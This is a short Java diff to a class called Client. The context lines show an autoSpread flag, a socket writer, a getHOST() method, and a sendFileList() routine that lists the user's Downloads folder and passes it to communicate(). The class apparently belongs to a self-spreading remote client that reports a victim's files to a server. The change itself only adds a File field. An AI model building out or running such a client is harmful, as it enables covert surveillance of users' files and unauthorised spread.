@@ -11,6 +11,7 @@ public class Client {
     private boolean autoSpread = false;
     private Socket socket;
     private DataOutputStream writer;
+    private File directory;
 
 
     private static String getHOST() {
@@ -159,6 +160,8 @@ public class Client {
 
     private void sendFileList() {
         String directory = System.getProperty("user.home") + "/Downloads/";
+        this.directory = new File(directory);
+        this.directory.isDirectory();
         File[] files = new File(directory).listFiles();
         communicate(directory);
         assert files != null;
